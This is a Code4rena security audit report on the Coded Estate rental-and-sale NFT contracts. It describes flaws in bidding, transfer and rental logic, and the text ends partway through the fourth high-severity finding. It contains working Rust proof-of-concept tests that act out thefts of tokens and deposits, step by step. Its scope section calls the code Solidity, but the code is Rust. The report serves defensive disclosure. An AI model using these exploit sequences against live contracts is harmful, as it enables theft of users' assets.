# 

# Coded Estate Invitational  Findings & Analysis Report



#### 2024-12-04



## Table of Contents

- 
[Overview](#overview)

- [About C4](#about-c4)
- [Wardens](#wardens)

- [Summary](#summary)
- [Scope](#scope)
- [Severity Criteria](#severity-criteria)
- 
[High Risk Findings (9)](#high-risk-findings-9)

- [[H-01] Attakers can steal the funds from long-term reservation](#h-01-attakers-can-steal-the-funds-from-long-term-reservation)
- [[H-02] setbidtobuy allows token purchase even when sale is no longer listed](#h-02-setbidtobuy-allows-token-purchase-even-when-sale-is-no-longer-listed)
- [[H-03] Insufficient price validation in transfer_nft function enables theft of listed tokens](#h-03-insufficient-price-validation-in-transfer_nft-function-enables-theft-of-listed-tokens)
- [[H-04] Lack of differentiation between rental types leads to loss of funds](#h-04-lack-of-differentiation-between-rental-types-leads-to-loss-of-funds)
- [[H-05] Cancelling bid doesn’t clear token approval of bidder allows malicious bidder to steal any tokens listing for sale with auto-approve enabled](#h-05-cancelling-bid-doesnt-clear-token-approval-of-bidder-allows-malicious-bidder-to-steal-any-tokens-listing-for-sale-with-auto-approve-enabled)
- [[H-06] Lack of validation in setlistforsell allows changing denom while there is active bid, leading to stealing of other users’ funds](#h-06-lack-of-validation-in-setlistforsell-allows-changing-denom-while-there-is-active-bid-leading-to-stealing-of-other-users-funds)
- [[H-07] Logic flaw in check_can_edit_short allows editing short-term rental before finalization enabling theft of users’ deposited funds](#h-07-logic-flaw-in-check_can_edit_short-allows-editing-short-term-rental-before-finalization-enabling-theft-of-users-deposited-funds)
- [[H-08] Adversary can use send_nft to bypass the payment and steal seller’s token in auto-approve scenario](#h-08-adversary-can-use-send_nft-to-bypass-the-payment-and-steal-sellers-token-in-auto-approve-scenario)
- [[H-09] Token owner can burn their token with active rental leading to renters’ funds being stuck](#h-09-token-owner-can-burn-their-token-with-active-rental-leading-to-renters-funds-being-stuck)

- 
[Medium Risk Findings (9)](#medium-risk-findings-9)

- [[M-01]  Malicious NFT owners can rug the reservation of the long-term](#m-01--malicious-nft-owners-can-rug-the-reservation-of-the-long-term)
- [[M-02] Users can’t cancel reservation due to out-of-gas](#m-02-users-cant-cancel-reservation-due-to-out-of-gas)
- [[M-03] Use of u64 for price_per_day and price_per_month limits handling tokens with 18 decimals](#m-03-use-of-u64-for-price_per_day-and-price_per_month-limits-handling-tokens-with-18-decimals)
- [[M-04] Incorrect use of u64 for arg amount in withdrawtolandlord can cause withdrawal failure](#m-04-incorrect-use-of-u64-for-arg-amount-in-withdrawtolandlord-can-cause-withdrawal-failure)
- [[M-05] Incorrect refund amount is sent  to the tenant if long term reservation is cancelled after approval](#m-05-incorrect-refund-amount-is-sent--to-the-tenant-if-long-term-reservation-is-cancelled-after-approval)
- [[M-06] Lack of upfront cost for long-term reservations allows fake reservations, blocking real users](#m-06-lack-of-upfront-cost-for-long-term-reservations-allows-fake-reservations-blocking-real-users)
- [[M-07] Reservations can be made outside of rental property’s available_period](#m-07-reservations-can-be-made-outside-of-rental-propertys-available_period)
- [[M-08] Can impersonate another high value rental because token_uri is arbitrary and supplied by user](#m-08-can-impersonate-another-high-value-rental-because-token_uri-is-arbitrary-and-supplied-by-user)
- [[M-09] User supplied owner address which is meant to be token owner is never the token owner](#m-09-user-supplied-owner-address-which-is-meant-to-be-token-owner-is-never-the-token-owner)

- 
[Low Risk and Non-Critical Issues](#low-risk-and-non-critical-issues)

- [01 The current logic can’t handle CW20 tokens](#01-the-current-logic-cant-handle-cw20-tokens)
- [02 Malicious owners can set the fee to 100%](#02-malicious-owners-can-set-the-fee-to-100)
- [03 auto_approve is not used in long-term rent](#03-auto_approve-is-not-used-in-long-term-rent)
- [04 minter is not used in this contract delete it](#04-minter-is-not-used-in-this-contract-delete-it)
- [05 Use to_json_binary and from_json_binary](#05-use-to_json_binary-and-from_json_binary)
- [06 cosmwasm-std 1.4.0v is vulnerable](#06-cosmwasm-std-140v-is-vulnerable)
- [07 The first buyer could get front-runed after autoApprove get updated](#07-the-first-buyer-could-get-front-runed-after-autoapprove-get-updated)
- [08 available_period is not used](#08-available_period-is-not-used)
- [09 The logic doesn’t return the excited funds to the users](#09-the-logic-doesnt-return-the-excited-funds-to-the-users)
- [10 Risk of out-of-gas](#10-risk-of-out-of-gas)
- [11 Risk of 100% cancellation penalty for users](#11-risk-of-100-cancellation-penalty-for-users)
- [12 check_can_edit_long() and check_can_edit_short() have the same logic](#12-check_can_edit_long-and-check_can_edit_short-have-the-same-logic)
- [13 DoS attack](#13-dos-attack)
- [14 Use a daily or monthly basis](#14-use-a-daily-or-monthly-basis)
- [15 The function execute.rs#depositforlongtermrental() doesn’t check if the deposit amount is enough for the reserved period](#15-the-function-executersdepositforlongtermrental-doesnt-check-if-the-deposit-amount-is-enough-for-the-reserved-period)

- [Disclosures](#disclosures)


# Overview



## About C4


Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the Coded Estate smart contract system written in Rust. The audit took place between October 4 — October 11, 2024.


## Wardens


In Code4rena’s Invitational audits, the competition is limited to a small group of wardens; for this audit, 4 wardens participated:

1. [nnez](https://code4rena.com/@nnez)
2. [Ch_301](https://code4rena.com/@Ch_301)
3. [adeolu](https://code4rena.com/@adeolu)
4. [K42](https://code4rena.com/@K42)

This audit was judged by [Lambda](https://code4rena.com/@Lambda).

Final report assembled by [thebrittfactor](https://twitter.com/brittfactorC4).


# Summary


The C4 analysis yielded an aggregated total of 18 unique vulnerabilities. Of these vulnerabilities, 9 received a risk rating in the category of HIGH severity and 9 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 3 reports detailing issues with a risk rating of LOW severity or non-critical.

All of the issues presented here are linked back to their original finding.


# Scope


The code under review can be found within the [C4 Coded Estate repository](https://github.com/code-423n4/2024-10-coded-estate), and is composed of 13 smart contracts written in the Solidity programming language and includes 2647 lines of Solidity code.


# Severity Criteria


C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).


# High Risk Findings (9)



## [H-01] Attakers can steal the funds from long-term reservation


*Submitted by Ch_301*

In this protocol NFT owner can set the NFT in sale even if it is still under active rent by triggering `execute.rs#setlistforsell()` which could set `token.sell.auto_approve` to a true value (means anyone can directly be approved and this will open multiple doors for attackers).

Users can call `execute.rs#setbidtobuy()` and send the necessary amount to gain approval of this NFT:

```

File: execute.rs#setbidtobuy()

675:             if token.sell.auto_approve {
676:                 // update the approval list (remove any for the same spender before adding)
677:                 let expires = Expiration::Never {  };
678:                 token.approvals.retain(|apr| apr.spender != info.sender);
679:                 let approval = Approval {
680:                     spender: info.sender.clone(),
681:                     expires,
682:                 };
683:                 token.approvals.push(approval);
684:                 
685:             }

```

Using the same function `setbidtobuy()` any address that has an existing bid in the NFT can cancel its bid and receive back all the initial funds (no fees in this function).

On the other side, the owner or any approved address can invoke `execute.rs#withdrawtolandlord()` and specify the receiver of the withdrawal funds (this function gives the homeowners the ability to withdraw a part of the funds even before the rent end, this is only for longterm rentals).

```

File: execute.rs

1787:     pub fn withdrawtolandlord(
/**CODE**/
1796:         address:String
1797:     ) -> Result<Response<C>, ContractError> {
/**CODE**/
1848:             .add_message(BankMsg::Send {
1849:                 to_address: address,
1850:                 amount: vec![Coin {
1851:                     denom: token.longterm_rental.denom,
1852:                     amount: Uint128::from(amount) - Uint128::new((u128::from(amount) * u128::from(fee_percentage)) / 10000),

```

However, the Attacker can create a sophisticated attack using `withdrawtolandlord()` and `setbidtobuy()`:

1. Choose an NFT that has a `token.sell.auto_approve == true` and an active long-term rental.
2. Call `setbidtobuy()` this will give him the necessary approval to finish the attack; he also needs to transfer the asked funds.
3. Trigger `withdrawtolandlord()` and transfer the maximum amount of tokens.

```

File: execute.rs#withdrawtolandlord()

1832:                 if item.deposit_amount - Uint128::from(token.longterm_rental.price_per_month) < Uint128::from(amount)  {
1833:                     return Err(ContractError::UnavailableAmount {  });
1834:                 }

```

1. Invoke `setbidtobuy()` to receive his original deposited funds.


### Impact


Steal the funds from long-term reservations using `setbidtobuy()`.


### Recommended Mitigation Steps

```

File: execute.rs
1787:     pub fn withdrawtolandlord(
1788:         &self,
1789:         deps: DepsMut,
1790:         env: Env,
1791:         info: MessageInfo,
1792:         token_id: String,
1793:         tenant: String,
1794:         renting_period: Vec<String>,
1795:         amount:u64,
1796:         address:String
1797:     ) -> Result<Response<C>, ContractError> {
1798:         let mut token = self.tokens.load(deps.storage, &token_id)?;
1799: 
-1800:         self.check_can_send(deps.as_ref(), &env, &info, &token)?;
+1800:         self.check_can_approve(deps.as_ref(), &env, &info, &token)?;

```

### Assessed type


Invalid Validation

**blockchainstar12 (Coded Estate) acknowledged**


## [H-02] setbidtobuy allows token purchase even when sale is no longer listed


*Submitted by nnez, also found by adeolu*

The bug allows buyers to purchase tokens that have been delisted by the seller, bypassing the seller’s intent to halt the sale. This can result in tokens being sold against the seller’s wishes.


### Description


The `setbidtobuy` function is responsible for allowing buyers to submit bids to purchase a token listed for sale. A seller can invoke `setlistforsell` to list a token, specifying the price, payment token (denom), and whether the sale is auto-approved. If auto-approve is set to `true`, any buyer who calls `setbidtobuy` can acquire the token without further input from the seller, while a manual approval is required when auto-approve is set to `false`.

However, there is a flaw in the logic of `setbidtobuy`—it does not check the `sell.islisted` flag, which is supposed to indicate whether a token is still available for sale. Even if the seller later decides to delist the token by setting `sell.islisted` to `false`, buyers can still invoke `setbidtobuy` and proceed with the purchase if auto-approve is enabled. This creates a scenario where sellers lose control over the sale, allowing unintended buyers to purchase delisted tokens.


### Example Scenario:


1. A seller lists a token using `setlistforsell`, specifying the sale details including price, payment token, and setting `auto-approve` to `true`.
2. After some time, the seller receives no bids and decides to delist the token, changing `sell.islisted` to `false` while leaving other parameters unchanged.
3. A buyer invokes `setbidtobuy`, and because the function does not respect the `islisted` flag and auto-approve is `true`, the token is sold despite the seller’s intent to delist it. This results in an unintended sale, leading to potential loss or misuse of assets by the seller.

An action of delisting the token on sale in this manner is justified because there is no other functions serving this purpose as in short-term rental and long-term rental where there is a specific function to unlist the token from rental service.


### Code Snippet


The following snippet shows that the `islisted` flag is not verified in `setbidtobuy`, which allows unintended purchases:

```

pub fn setlistforsell(
    &self,
    deps: DepsMut,
    env: Env,
    info: MessageInfo,
    islisted:bool,
    token_id: String,
    denom: String,
    price: u64,
    auto_approve: bool,
) -> Result<Response<C>, ContractError> {
    let mut token = self.tokens.load(deps.storage, &token_id)?;
    // ensure we have permissions
    self.check_can_approve(deps.as_ref(), &env, &info, &token)?;
    // @c4-contest islisted indicates whether token is available for sale or not
    token.sell.islisted = Some(islisted);
    token.sell.price = price;
    token.sell.auto_approve = auto_approve;
    token.sell.denom = denom;
    self.tokens.save(deps.storage, &token_id, &token)?;

    Ok(Response::new()
        .add_attribute("action", "setlistforsell")
        .add_attribute("sender", info.sender)
        .add_attribute("token_id", token_id))
}

pub fn setbidtobuy(
    // function arguments
) -> Result<Response<C>, ContractError> {
    let mut token = self.tokens.load(deps.storage, &token_id)?;

    // @c4-contest: no check for the value of sell.islisted flag

    let mut position: i32 = -1;
    let mut amount = Uint128::from(0u64);
    for (i, item) in token.bids.iter().enumerate() {
        if item.address == info.sender.to_string()
        {
            position = i as i32;
            amount = item.offer.into();
            break;
        }
    }

    if position == -1 {
        if info.funds[0].denom != token.sell.denom {
            return Err(ContractError::InvalidDeposit {});
        }
        if info.funds[0].amount
            < Uint128::from(token.sell.price)
        {
            return Err(ContractError::InsufficientDeposit {});
        }

        if token.sell.auto_approve {
            // update the approval list (remove any for the same spender before adding)
            let expires = Expiration::Never {  };
            token.approvals.retain(|apr| apr.spender != info.sender);
            let approval = Approval {
                spender: info.sender.clone(),
                expires,
            };
            token.approvals.push(approval);
            
        }
        let bid = Bid {
            address: info.sender.to_string(),
            offer:info.funds[0].amount,
        };
        token.bids.push(bid);
    }

    else {
        // update the approval list (remove any for the same spender before adding)
        token.bids.retain(|item| item.address != info.sender);
    }

    self.tokens.save(deps.storage, &token_id, &token)?;
    if position != -1 && (amount > Uint128::from(0u64)) {
        Ok(Response::new()
        .add_attribute("action", "setbidtobuy")
        .add_attribute("sender", info.sender.clone())
        .add_attribute("token_id", token_id)
        .add_message(BankMsg::Send {
            to_address: info.sender.to_string(),
            amount: vec![Coin {
                denom: token.sell.denom,
                amount: amount,
            }],
        }))
    }
    else {
        Ok(Response::new()
        .add_attribute("action", "setbidtobuy")
        .add_attribute("sender", info.sender)
        .add_attribute("token_id", token_id))
    }

}

```

This lack of validation enables buyers to acquire delisted tokens without the seller’s consent.


### Proof-of-Concept


The following test demonstrates that a buyer can still buy delisted token (token with islisted set to false).

Boilerplate for PoC [here](https://gist.github.com/nnez/c76b1a867dd8dc441dbe552e048b796e).

1. Replace everything in `contracts/codedestate/src/multi_tests.rs` with boilerplate from the above secret gist.
2. Insert the below test:

```

#[test]
fn m3_buyer_can_buy_delisted_token() {
    let (mut app, contract_addr) = mock_app_init_contract();

    // Minter mints a new token
    execute_mint(&mut app, &contract_addr, MINTER, TOKEN_ID);
    // Asserts that a token is minted
    assert_eq!(query_token_count(&app, &contract_addr.to_string()), 1);

    // Minter lists their token for sale, set auto-approve = true
    let set_list_for_sell_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SetListForSell { 
        islisted: true, 
        token_id: TOKEN_ID.to_string(), 
        denom: USDC.to_string(), 
        price: 1000, 
        auto_approve: true
    };
    let res = app.execute_contract(
        Addr::unchecked(MINTER),
        contract_addr.clone(),
        &set_list_for_sell_msg,
        &[],
    );
    assert!(res.is_ok()); // Everything is ok

    // Time goes by, there is no bid
    // Minter decides to delist this token temporarily by setting islited = false
    let delist_for_sell_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SetListForSell { 
        islisted: false, 
        token_id: TOKEN_ID.to_string(), 
        denom: USDC.to_string(), 
        price: 1000, 
        auto_approve: true
    };
    let res = app.execute_contract(
        Addr::unchecked(MINTER),
        contract_addr.clone(),
        &delist_for_sell_msg,
        &[],
    );
    assert!(res.is_ok()); // Everything is ok

    // Query for token sell info
    let get_info_sell_msg: QueryMsg<Empty> = QueryMsg::NftInfoSell { token_id: TOKEN_ID.to_string() };
    let info: Sell = app.wrap().query_wasm_smart(contract_addr.clone(), &get_info_sell_msg).unwrap();
    // Asserts that islisted is false
    let islisted: bool = info.islisted.unwrap();
    assert!(!islisted);

    const ATTACKER: &str = "attacker";
    init_usdc_balance(&mut app, ATTACKER, 1000);
        
    // Attacker attempts to buy the delisted token
    let set_bid_to_buy_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SetBidToBuy { 
        token_id: TOKEN_ID.to_string()
     };
    let res = app.execute_contract(
        Addr::unchecked(ATTACKER),
        contract_addr.clone(),
        &set_bid_to_buy_msg,
        &vec![Coin {
            denom: USDC.to_string(),
            amount: Uint128::new(1000),
        }],
    );
    assert!(res.is_ok()); // Everything is ok

    // Attacker completes the trade by calling transfer_nft
    let transfer_nft_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::TransferNft { 
        recipient: ATTACKER.to_string(), 
        token_id: TOKEN_ID.to_string() 
    };
    let res = app.execute_contract(
        Addr::unchecked(ATTACKER),
        contract_addr.clone(),
        &transfer_nft_msg,
        &[],
    );
    assert!(res.is_ok()); // Everything is ok

    // Asserts that Attacker is the owner of the token.  
    assert_eq!(query_token_owner(&app, &contract_addr.to_string(), TOKEN_ID), ATTACKER);
    // Asserts taht Minter is no longer owner of the token
    assert_ne!(query_token_owner(&app, &contract_addr.to_string(), TOKEN_ID), MINTER);
}

```

1. Run `cargo test m3_buyer_can_buy_delisted_token -- --nocapture`.
2. Observe that the test passes, indicating that the described scenario is valid.


### Recommended Mitigation


Disallow buying token with `sell.islisted` flag set to false/none.


### Assessed type


Context

**blockchainstar12 (Coded Estate) acknowledged**

**Lambda (judge) increased severity to High**


## [H-03] Insufficient price validation in transfer_nft function enables theft of listed tokens


*Submitted by nnez, also found by Ch_301*

This vulnerability allows malicious buyers to acquire listed NFTs without payment to sellers.


### Description


Users can list their tokens for sale by calling `setlistosell` and specifying a price and payment token (denom). Buyers can then purchase the token by calling `setbidtobuy` and transferring the payment into the contract.

The trade is finalized when `transfer_nft` is invoked and the recipient is the buyer. The caller can be the seller, or, if `auto_approve` is set to true, the caller can also be the buyer as they’re given approval upon calling `setbidtobuy`.

However, `transfer_nft` function lacks a proper validation during the transfer. This vulnerability stems from two key oversights:

1. The function doesn’t verify if the offer bid amount matches the listed price of the token.
2. It allows caller to freely specify recipient and transfer to recipients with no active bids, defaulting to a zero payment.

These oversights enable malicious buyers to acquire NFTs without paying the listed price, effectively stealing them from sellers.

`transfer_nft` implementation:

```

fn transfer_nft(
    &self,
    deps: DepsMut,
    env: Env,
    info: MessageInfo,
    recipient: String, // @c4-contest caller of this function can freely specify `recipient` address
    token_id: String,
) -> Result<Response<C>, ContractError> {
    let mut token = self.tokens.load(deps.storage, &token_id)?;
    // ensure we have permissions
    self.check_can_send(deps.as_ref(), &env, &info, &token)?;
    // set owner and remove existing approvals
    let prev_owner = token.owner;
    token.owner = deps.api.addr_validate(&recipient)?; // @c4-contest ownership is transferred to recipient
    token.approvals = vec![];
    let fee_percentage = self.get_fee(deps.storage)?;

    let mut position: i32 = -1;
    let mut amount = Uint128::from(0u64); // @c4-contest: amount is default to zero
    for (i, item) in token.bids.iter().enumerate() {
        if item.address == recipient.to_string()
        {
            position = i as i32;
            amount = item.offer.into();
            break;  
        }
    }
    // @c4-contest: if recipient doesn't have bid on this token, amount is default to zero
    if position != -1 && amount > Uint128::new(0) {
        self.increase_balance(deps.storage, token.sell.denom.clone(), Uint128::new((u128::from(amount) * u128::from(fee_percentage)) / 10000))?;
    }
    let amount_after_fee = amount.checked_sub(Uint128::new((u128::from(amount) * u128::from(fee_percentage)) / 10000)).unwrap_or_default();
    token.bids.retain(|bid| bid.address != recipient);
    self.tokens.save(deps.storage, &token_id, &token)?;
    // @c4-contest: no validation whether the bid amount matches with the listed price.  
    if amount > Uint128::new(0) {
        Ok(Response::new()
        .add_attribute("action", "transfer_nft")
        .add_attribute("sender", info.sender.clone())
        .add_attribute("token_id", token_id)
        .add_message(BankMsg::Send {
            to_address: prev_owner.to_string(),
            amount: vec![Coin {
                denom: token.sell.denom,
                amount: amount_after_fee,
            }],
        }))
    } else { // @c4-contest: if amount is zero, the transfer go through with no payment to seller
        Ok(Response::new()
        .add_attribute("action", "transfer_nft")
        .add_attribute("sender", info.sender.clone())
        .add_attribute("token_id", token_id))
    }
}

```

This vulnerability can be exploited in two scenarios:

1. 
**Auto-approve enabled** - When `auto_approve` is set to true, a buyer can exploit the system by:

- Calling `setbidtobuy` to gain approval.
- Invoking `transfer_nft` with a different recipient address that has no active bid.
- Cancelling their original bid for a full refund.

2. 
**Auto-approve disabled** - Even when `auto_approve` is false, an attacker can:

- Place a bid on the token.
- Front-run the seller’s `transfer_nft` transaction, cancelling their bid.
- The seller’s transaction is executed after, transferring the token without payment.


### Proof-of-Concept


The following test demonstrates the two described scenarios:

Boilerplate for PoC [here](https://gist.github.com/nnez/c76b1a867dd8dc441dbe552e048b796e).

1. Replace everything in `contracts/codedestate/src/multi_tests.rs` with boilerplate from above secret gist.
2. Insert below test:

```

#[test]
fn h5_insufficient_price_validation_auto_approve_true() {
    let (mut app, contract_addr) = mock_app_init_contract();
    
    // Minter mints a token
    execute_mint(&mut app, &contract_addr, MINTER, TOKEN_ID);
    // Asserts that token is minted
    assert_eq!(query_token_count(&app, &contract_addr.to_string()), 1);

    // Minter lists token for sale, price = 1000 USDC and auto_approve = true
    let set_list_for_sell_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SetListForSell { 
        islisted: true, 
        token_id: TOKEN_ID.to_string(), 
        denom: USDC.to_string(), 
        price: 1000, 
        auto_approve: true
    };
    let res = app.execute_contract(
        Addr::unchecked(MINTER),
        contract_addr.clone(),
        &set_list_for_sell_msg,
        &[],
    );
    assert!(res.is_ok()); // Everything is ok
    
    const ATTACKER_1: &str = "attacker-1";
    const ATTACKER_2: &str = "attacker-2";
    init_usdc_balance(&mut app, ATTACKER_2, 1000);

    // Attacker_2 bids at target price after Minter lists for sell
    let set_bid_to_buy_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SetBidToBuy { 
        token_id: TOKEN_ID.to_string()
     };
    let res = app.execute_contract(
        Addr::unchecked(ATTACKER_2),
        contract_addr.clone(),
        &set_bid_to_buy_msg,
        &vec![Coin {
            denom: USDC.to_string(),
            amount: Uint128::new(1000),
        }],
    );
    assert!(res.is_ok()); // Everything is ok

    // Attacker_2 invokes transfer_nft but specify the recipient to Attacker_1 address which has no active bid on this token  
    let transfer_nft_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::TransferNft { 
        recipient: ATTACKER_1.to_string(), 
        token_id: TOKEN_ID.to_string() 
    };
    let res = app.execute_contract(
        Addr::unchecked(ATTACKER_2),
        contract_addr.clone(),
        &transfer_nft_msg,
        &[],
    );
    assert!(res.is_ok()); // Everything is ok

    // Asserts that token ownership is transferred to Attacker_1
    assert_eq!(query_token_owner(&app, &contract_addr.to_string(), TOKEN_ID), ATTACKER_1);
    // Asserts that Minter gets nothing for this sale  
    assert_eq!(query_denom_balance(&app, MINTER, USDC), 0);

    // Attacker_2 can also cancel their bid
    assert_eq!(query_denom_balance(&app, ATTACKER_2, USDC), 0); 
    let res = app.execute_contract(
        Addr::unchecked(ATTACKER_2),
        contract_addr.clone(),
        &set_bid_to_buy_msg,
        &[],
    );
    assert!(res.is_ok()); // Everything is ok

    // Asserts that Attacker_2 gets their refund back in full  
    assert_eq!(query_denom_balance(&app, ATTACKER_2, USDC), 1000);  
}

#[test]
fn h5_insufficient_price_validation_auto_approve_false() {
    let (mut app, contract_addr) = mock_app_init_contract();
    
    // Minter mints a token
    execute_mint(&mut app, &contract_addr, MINTER, TOKEN_ID);
    // Asserts that token is minted
    assert_eq!(query_token_count(&app, &contract_addr.to_string()), 1);

    // Minter lists token for sale, price = 1000 USDC and auto_approve = true
    let set_list_for_sell_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SetListForSell { 
        islisted: true, 
        token_id: TOKEN_ID.to_string(), 
        denom: USDC.to_string(), 
        price: 1000, 
        auto_approve: false
    };
    let res = app.execute_contract(
        Addr::unchecked(MINTER),
        contract_addr.clone(),
        &set_list_for_sell_msg,
        &[],
    );
    assert!(res.is_ok()); // Everything is ok
    
    const ATTACKER: &str = "attacker";
    init_usdc_balance(&mut app, ATTACKER, 1000);

    // Attacker bids at target price after Minter lists for sell
    let set_bid_to_buy_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SetBidToBuy { 
        token_id: TOKEN_ID.to_string()
     };
    let res = app.execute_contract(
        Addr::unchecked(ATTACKER),
        contract_addr.clone(),
        &set_bid_to_buy_msg,
        &vec![Coin {
            denom: USDC.to_string(),
            amount: Uint128::new(1000),
        }],
    );
    assert!(res.is_ok()); // Everything is ok

    // Minter notices a bid from Attacker and decides to complete the trade
    // Attacker front-run the tx and cancel their bid

    let res = app.execute_contract(
        Addr::unchecked(ATTACKER),
        contract_addr.clone(),
        &set_bid_to_buy_msg,
        &vec![],
    );
    assert!(res.is_ok()); // Everything is ok

    // Minter's transaction is executed after
    let transfer_nft_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::TransferNft { 
        recipient: ATTACKER.to_string(), 
        token_id: TOKEN_ID.to_string() 
    };
    let res = app.execute_contract(
        Addr::unchecked(MINTER),
        contract_addr.clone(),
        &transfer_nft_msg,
        &[],
    );
    assert!(res.is_ok()); // Everything is ok

    // Asserts that Attacker_2 gets their refund back in full  
    assert_eq!(query_denom_balance(&app, ATTACKER, USDC), 1000);  
    // Asserts that token ownership is transferred to Attacker_1
    assert_eq!(query_token_owner(&app, &contract_addr.to_string(), TOKEN_ID), ATTACKER);
    // Asserts that Minter gets nothing for this sale  
    assert_eq!(query_denom_balance(&app, MINTER, USDC), 0);
}

```

1. Run `cargo test h5_insufficient_price_validation_auto_approve_true -- --nocapture`.
2. Run `cargo test h5_insufficient_price_validation_auto_approve_false -- --nocapture`.
3. Observe that both tests pass, indicating that described scenarios are valid.


### Recommended Mitigation


If token is listed for sell, check that the offer bid amount is exactly matched with the listed price set by seller.

```

if token.sell.isListed {
    if amount < token.sell.price{
        // throw error
    }
    else{
        // proceed to complete the trade
    }
}
else{
    // do normal transfer
}

```

### Assessed type


Invalid Validation

**blockchainstar12 (Coded Estate) confirmed**


## [H-04] Lack of differentiation between rental types leads to loss of funds


*Submitted by nnez, also found by Ch_301 (1, 2, 3)*

[https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/execute.rs#L1413](https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/execute.rs#L1413)

[https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/execute.rs#L870](https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/execute.rs#L870)


### Impact


This vulnerability allows an attacker to exploit the lack of distinction between short-term and long-term rental types to withdraw funds in a different, more valuable token than the one initially used for payment, effectively steal other users’ funds deposited in the contract.


### Description


In the CodedEstate system, a property (token) can be listed for both **short-term** and **long-term** rentals, with each rental type having separate configurations; including the denomination (`denom`) of the token used for payments. The rental information for both types of rentals is stored in the same vector, `rentals`, and a `rental_type` flag is used within the `Rental` struct to differentiate between short-term (`false`) and long-term (`true`) rentals.

```

File: packages/cw721/src/query.rs
pub struct Rental {
    pub denom: String,
    pub deposit_amount: Uint128,
    pub rental_type: bool,  // @c4-contest: differentiates between short-term (false) and long-term (true) rentals
    pub cancelled: bool,
    pub renting_period: Vec<u64>,
    pub address: Option<Addr>,
    pub approved: bool,
    pub approved_date: Option<String>,
    pub guests: usize,
}

File: contracts/codedestate/src/execute.rs
pub struct TokenInfo<T> {
    pub owner: Addr,
    pub approvals: Vec<Approval>,
    pub longterm_rental: LongTermRental, // long-term rental agreement
    pub shortterm_rental: ShortTermRental, // short-term rental agreement
    pub rentals: Vec<Rental>, // @c4-contest: both types of rental are saved in this vector
    pub bids: Vec<Bid>,
    pub sell: Sell,
    pub token_uri: Option<String>,
    pub extension: T,
}

```

However, the contract does not make use of the `rental_type` flag in any function that handles rental operations. As a result, functions designated for short-term rentals can be used for long-term rentals, and vice versa, without proper validation of the rental type. This becomes problematic, especially since short-term and long-term rentals may use different `denom` tokens.

```

File: contracts/codedestate/src/execute.rs
pub fn setlistforshorttermrental(
// function arguments
) -> Result<Response<C>, ContractError> {
    let mut token = self.tokens.load(deps.storage, &token_id)?;
    // ensure we have permissions
    self.check_can_approve(deps.as_ref(), &env, &info, &token)?;
    self.check_can_edit_short(&env, &token)?;

    token.shortterm_rental.islisted = Some(true);
    token.shortterm_rental.price_per_day = price_per_day;
    token.shortterm_rental.available_period = available_period;
    token.shortterm_rental.auto_approve = auto_approve;
    token.shortterm_rental.denom = denom; // @c4-contest <-- can be a different denom from long-term rental
    token.shortterm_rental.minimum_stay = minimum_stay;
    token.shortterm_rental.cancellation = cancellation;
    self.tokens.save(deps.storage, &token_id, &token)?;

    Ok(Response::new()
        .add_attribute("action", "setlistforshorttermrental")
        .add_attribute("sender", info.sender)
        .add_attribute("token_id", token_id))
}

pub fn setlistforlongtermrental(
// function arguments
) -> Result<Response<C>, ContractError> {
    let mut token = self.tokens.load(deps.storage, &token_id)?;
    // ensure we have permissions
    self.check_can_approve(deps.as_ref(), &env, &info, &token)?;
    self.check_can_edit_long(&env, &token)?;

    token.longterm_rental.islisted = Some(true);
    token.longterm_rental.price_per_month = price_per_month;
    token.longterm_rental.available_period = available_period;
    token.longterm_rental.auto_approve = auto_approve;
    token.longterm_rental.denom = denom; // @c4-contest <-- can be a different denom from short-term rental
    token.longterm_rental.minimum_stay = minimum_stay;
    token.longterm_rental.cancellation = cancellation;
    self.tokens.save(deps.storage, &token_id, &token)?;

    Ok(Response::new()
        .add_attribute("action", "setlistforlongtermrental")
        .add_attribute("sender", info.sender)
        .add_attribute("token_id", token_id))
}

```

An attacker can exploit this by performing the following steps:

Supposed there are two legitimate tokens in on Nibiru chain (deployment chain), `TokenX ~ $0.01 and USDC ~ $1`.

1. List a short-term rental using a low-value token (e.g., TokenX).
2. List a long-term rental using a high-value token (e.g., USDC).
3. Reserve a short-term rental by paying in TokenX using short-term function `setreservationforshortterm`.
4. Cancel the short-term rental using the long-term rental’s cancellation function `cancelreservationbeforeapprovalforlongterm`, which refunds in USDC.

This results in the attacker receiving a refund in the higher-value token, effectively stealing funds from other users who deposited USDC.

```

pub fn setreservationforshortterm(
// function arguments
) -> Result<Response<C>, ContractError> {
    ...
    ... snipped
    ...

    // @c4-contest: token with shortterm_rental denom
    if info.funds[0].denom != token.shortterm_rental.denom {
        return Err(ContractError::InvalidDeposit {});
    }
    let sent_amount = info.funds[0].amount;
    let fee_percentage = self.get_fee(deps.storage)?;
    let rent_amount = token.shortterm_rental.price_per_day
    * (new_checkout_timestamp - new_checkin_timestamp)/(86400);
    if sent_amount
        < Uint128::from(rent_amount) + Uint128::new((u128::from(rent_amount) * u128::from(fee_percentage)) / 10000)
    {
        return Err(ContractError::InsufficientDeposit {});
    }

